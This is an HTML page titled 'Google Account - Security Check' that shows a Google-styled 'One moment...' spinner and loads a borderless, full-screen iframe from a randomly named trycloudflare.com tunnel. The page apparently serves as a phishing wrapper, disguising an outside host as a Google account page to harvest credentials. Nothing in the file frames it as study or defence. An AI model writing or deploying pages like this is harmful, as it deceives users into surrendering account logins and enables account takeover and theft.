<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google Account - Security Check</title>
    <style>
        /* Ensures the Iframe is full-screen without borders or scrollbars */
        body, html { 
            margin: 0; 
            padding: 0; 
            height: 100%; 
            width: 100%; 
            overflow: hidden; 
            background-color: white; 
            font-family: 'Roboto', Arial, sans-serif;
        }

        /* Positions the loading animation BEHIND the iframe */
        .loader-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            position: absolute;
            width: 100%;
            z-index: 1; /* Stay behind */
        }

        iframe { 
            position: absolute;
            top: 0;
            left: 0;
            width: 100%; 
            height: 100%; 
            border: none; 
            z-index: 2; /* Stay in front */
            background-color: transparent;
        }

        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4285F4;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader-container">
        <div class="spinner"></div>
        <p style="color: #5f6368; margin-top: 15px;">One moment...</p>
    </div>

    <iframe src="https://pregnancy-effective-federal-consultation.trycloudflare.com"></iframe>

</body>
</html>
